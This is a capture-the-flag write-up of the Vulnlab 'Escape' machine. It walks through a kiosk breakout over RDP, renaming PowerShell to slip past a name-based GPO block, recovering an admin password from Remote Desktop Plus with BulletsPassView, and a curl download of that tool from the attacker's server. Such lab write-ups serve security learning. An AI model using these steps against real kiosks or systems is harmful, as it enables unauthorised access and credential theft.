---
title: Escape - Vulnlab
date: 2024-06-05 01:58:49
tags: [vulnlab, Easy]
categories: vulnlab
keywords: 'Vulnlab, Easy, Windows'
description: This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.
cover: /images/vulnlab/escape-vl/escape_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

This box was really creative, and involved a Kiosk breakout with the only port being 3389. When I initially started this, I was going into it relatively blind. The attack path is more so up to interpretation and really get's you thinking into understanding what you have access to and exploiting it.

# Enumeration

With that being said, let's start with our initial NMAP scan. Given that just RDP is on this machine, I'll run an aggressive scan immediately so that we can get the DNS information for our host file.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 21:28 EDT
Nmap scan report for 10.10.105.242
Host is up (0.10s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Escape
| Not valid before: 2024-02-02T11:08:33
|_Not valid after:  2024-08-03T11:08:33
| rdp-ntlm-info: 
|   Target_Name: ESCAPE
|   NetBIOS_Domain_Name: ESCAPE
|   NetBIOS_Computer_Name: ESCAPE
|   DNS_Domain_Name: Escape
|   DNS_Computer_Name: Escape
|   Product_Version: 10.0.19041
|_  System_Time: 2024-05-30T01:29:15+00:00
|_ssl-date: 2024-05-30T01:29:20+00:00; +2s from scanner time.
```

There's not much for us to enumerate, aside from attempting to RDP to the machine. We can do so with either `remmina`, `xfreerdp`, or `rdesktop`. I'll use `rdesktop` since I'm aware that you can authenticate with null credentials easy using that tool.

# Restricted Kiosk Access

```
└─$ rdesktop -u DaZ 10.10.105.242
[...snip...]
Do you trust this certificate (yes/no)? yes
```

![](/images/vulnlab/escape-vl/b.jpg)

Given the result of the conference display, we are told to authenticate to this machine with the user `KioskUser0` without a password. We'll use `xfreerdp /v:10.10.105.242 /u:KioskUser0` to authenticate to this machine properly.

Once we login with the above command, we can see we are greeted with the home screen of a kiosk.

![](/images/vulnlab/escape-vl/c.jpg)

There doesn't seem to be anything within our desktop interface, though we can access the Start Menu by pressing our home key.

Another thing you'll notice is that the interface is entirely in Korean, which is probably not an issue for some people (but I myself can't speak Korean). I tried changing this in the Language settings, which you can access from the search bar in the Start Menu. The only pre-req is that you'll need to either restart the machine or cause the current user to sign-out, which I do not believe we can accomplish until we get code execution.

At this point it's just a matter of messing around with what we can do - I found that there aren't any pertinent settings that we can change on the machine nor can we access cmd/PowerShell.

![](/images/vulnlab/escape-vl/d.jpg)

There looks to be some form of policy that is disallowing us from access a lot of the machine's main resources, even File Explorer. I ended up downloading Google Translate on my phone and taking a picture of this, it seems the message says `"Cannot open 'C:\Windows\System32'. Your organization has blocked you."`. I'm guessing that there is a GPO preventing us from accessing this specific folder and all of it's resources.

So let's do some thinking here - we're not able to access any resources in System32 which is preventing us from doing the majority of the legwork needed to get code execution. Without this we can't really get far into the kiosk. We also won't be able to access the File Explorer regularly since `iexplorer.exe` is within this folder.

# Bypass using Installed Programs

That being said, there are other resources that we can access that are not in this specific folder that might help us. If search up `Apps & Features`, we can see applications such as Cortana, Paint, and a variety of O365 tools.

You'll notice though that Microsoft Edge is also here, which is the built-in browser for this machine that is installed automatically. The binary is denoted as `msedge.exe`, and can be found in `C:\Program Files (x86)\Microsoft\Edge\Application`. Since this binary isn't usually in System32, we should be able to access it if the GPO doesn't restrict it.


![](/images/vulnlab/escape-vl/e.jpg)

After accepting a few Edge first-launch parameters, we're greeted with the home-page for Edge.

Immediately the first thing that came to me was the URL path. Right now, it seems that we are within `edge://welcome`, which is probably a landing page for Microsoft Edge within the contents of its directory. 

What's stopping us from altering this though? If we change the identifier to `file://` and change the file location, it shouldn't exempt us from accessing resources. This is because we're not trying to access directories in the context of `KioskUser0`, but instead as the user agent for Edge.

![](/images/vulnlab/escape-vl/f.jpg)

This seemed to work! We should be able to access the entirety of the kiosk's filesystem through as the Edge user agent, meaning we can also technically read the first flag right now without getting code execution.

The file path for the first user flag can be denoted below.

```
(file:///C:/Users/kioskUser0/Desktop/user_07eb46.txt)
```

While this is great for showing how fast we were able to get the user flag, we still need to get code execution in some way. This involves a little more messing around with in terms of what we have access to - but our range of options should open up now that we have access to the System32 folder.

# Misconfigured Policy Abuse

One thing to mention, you'll notice that if you try to access any binaries or executables, it will download them locally to your user's Download folder (excluding text files like the user flag). I'll start with trying to mess around with the `cmd.exe` and `powershell.exe` binaries.

I managed to find a solution really quickly, which revolved around both of these binaries. If you try to download them, they'll pop-up with a warning (due to the filename being abnormal to Edge, it's a binary after all). Selecting the left option that pops-up will download the file to the `KioskUser0`'s download directory in their home folder.

![](/images/vulnlab/escape-vl/g.jpg)

You can access this specific location within the filesystem by right-clicking on the binary and/or pressing the small folder icon that appears in the drop-down menu.

![](/images/vulnlab/escape-vl/h.jpg)

Not only are we able to access the file explorer now, but we can interact with this binary to potentially actually get code execution. You can do this with `cmd.exe` too, it's honestly up to your preference. If you try to execute this file, it will be blocked by the GPO and will prevent you from executing the binary and spawning a PowerShell session.

Now let's think - the GPO itself is blocking all files that are ran within the System32 folder or that have the same name as the binaries that are within that folder (with what know so far). While the files themselves can have their signatures also blocked (essentially meaning all files that have application signatures or icons similar to applications like `powershell` or `cmd.exe`), we don't exactly know if that's true right now.

However, if the GPO only relies on the name of the binary in order to block access, then we can probably change the name of the binary and run it in the context of a binary that is accepted. Let's take `msedge.exe` for example since we know we were able to access that when trying to open Edge. I'll change the name of the file to `msedge` by pressing `F2` after clicking on the binary once.

![](/images/vulnlab/escape-vl/i.jpg)

After opening the file, it seems like we were able to open up a PowerShell window! This means our theory from before was correct, the GPO is only blocking binaries that share a name with a binary in System32.

Now that we have code execution, we would normally read the user flag now if we didn't view it earlier.

# Privilege Escalation to Administrator

Now that we have a PowerShell session, let's look for other users we can potentially exploit.

```
    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2/3/2024   2:39 AM                admin
d-----          2/3/2024   3:44 AM                Administrator
d-----          2/3/2024   3:12 AM                DefaultAppPool
d-----          2/3/2024   3:10 AM                kioskUser0
d-r---          2/3/2024   2:38 AM                Public
```

It seems that the only other user that we can potentially pivot to is either `admin` or `Administrator`. The other two profiles we can ignore as they're default users.

The `admin` user seems to be odd, as this is not a common account name. We can assume that this is the admin of the kiosk, in which is the user we are trying to escalate to. Before we try anything, let's see if we have any privileges that we can exploit.

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

We don't seem to have any privileges that we can exploit, as these are relatively common privileges given to regular users.

So let's think - we don't have any privileges that we can exploit, there's only one user we can escalate to, there are no DPAPI credentials in `kioskUser0`'s home directory, and there isn't Active Directory enabled on this machine so we can't pivot to another domain user. This has to mean that there is a binary present on the machine that we can exploit in some way.

I did some digging into the filesystem and found an interesting file within the root `C:\` drive on the filesystem.

```
PS C:\> Get-ChildItem . -Force


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
[...snip...]
d--h--          2/3/2024   3:05 AM                _admin
[...snip...]
```

This directory is also abnormal and isn't installed by default. Accessing this directory will lead you to two interesting files/directories, being `passwords` and `profiles.xml`

Doing some more digging, it doesn't seem that `passwords` has much, though there does seem to be enticing information within the XML file.

```
PS C:\_admin> cat profiles.xml
<?xml version="1.0" encoding="utf-16"?>
<!-- Remote Desktop Plus -->
<Data>
  <Profile>
    <ProfileName>admin</ProfileName>
    <UserName>127.0.0.1</UserName>
    <Password>JWqkl6IDfQxXXmiHIKIP8ca0G9XxnWQZgvtPgON2vWc=</Password>
    <Secure>False</Secure>
  </Profile>
</Data>
```

This seems to be a user hash for the `admin` user, we can try to crack this with `JTR` or `Hashcat` however I couldn't find much success as they both could not recognize the hash. You'd think it's base64 encoded given the `=`, however I found that to not be true.

This file does belong to `Remote Desktop Plus`, which is not a normal application present on this machine. If we type in `rdp` into the search bar in the Start Menu, it looks like the application is installed already.

# Reading Plaintext Passwords with BPV

Though we aren't able to open it from here, we should be able to access the binary from within the PowerShell window we have right now. It's within `C:\Program Files(x86)\Remote Desktop Plus`.

![](/images/vulnlab/escape-vl/j.jpg)

I did some research into RDP+, there doesn't like anything that we can exploit in particular, and the initial window doesn't seem to have any important information.

That is until I realized the one thing we can do, which is within `Manage profiles...`. We don't have any profiles at first in the window that pops up, but it does allow us to import profiles based on a respective profile file. We did have one before for the `admin` user, so let's try to import that. Note that you'll need to move the `profiles.xml` file to a place you can actually access, which I moved to the `Downloads` folder and then imported from there.

![](/images/vulnlab/escape-vl/k.jpg)

Now that we imported the profile - we can see that RDP+ displays the password in bulleted-text. This means that the plaintext password must've been loaded into the application, as the length has shrunk immensely (in comparison to the hash).

Now that we have the password technically on our screen, we can use a tool that isn't commonly used on machines for red-teaming - [BulletsPassView](https://www.nirsoft.net/utils/bullets_password_view.html). This is a password recovery tool, and is used to reveal passwords that are stored behind bullets in a regular text-box. It's used to help users who forget their passwords, and allows them to easily reveal and copy their plaintext passwords for reusage.

We'll be using this tool to help reveal the `admin` password. This specific executable isn't malicious in nature, which I'm thankful for since Defender is enabled on this kiosk. (You can test this by just running `"Invoke-Mimikatz"` in your PowerShell session.)

All that we'll need is a Python server on our Kali machine (we're actually using our Kali host for the first time - and we're about to root this box!) with the BPV.exe file. You can download BPV from the link I posted and start a Python server with `python3 -m http.server (PORT)`.

After that's finished, we'll use cURL to download the executable to the kiosk `curl http://(KALI IP):(PORT)/BuletsPassView.exe -O BPV.exe`. We can then run the binary and the application should load. (Note, make sure to download the x64-bit version so it can properly detect RDP+)

![](/images/vulnlab/escape-vl/l.jpg)

If you have both RDP+ and BPV opened, upon refreshing you should see the password in plaintext. This means we can now escalate to this user! You can do so by just starting a new PowerShell process using `runas`.

```
PS C:\Users\kioskUser0\Downloads> runas /user:ESCAPE\admin C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

This should elevate us to `admin`, though you'll notice that our privileges are still the same as the `Administrator` user. We can circumvent this by doing `Start-Process powershell -verb runAs` to start up another PowerShell window in the context of the Administrator user as the `admin` user as UAC bypass enabled. If you run `whoami /priv` after this, you'll see that we are now the Administrator on the machine.

![](/images/vulnlab/escape-vl/m.jpg)

As noted above, the root flag is within `C:\Users\Administrator\Desktop\root.txt`, meaning we have successfully rooted this machine!

# Conclusion

This box specifically was really fun, as it relied solely on your thinking as to what you can access. It also limited our Kali usage, which seemed like a new breath of fresh air (though I really am ready to use Kali again!). Big thanks to xct and kozie for the development of it, it definitely helped me to think outside the box!

# Resources

https://www.nirsoft.net/utils/bullets_password_view.html
https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
https://book.hacktricks.xyz/hardware-physical-access/escaping-from-gui-applications
https://www.secquest.co.uk/white-papers/introduction-to-kiosk-breakout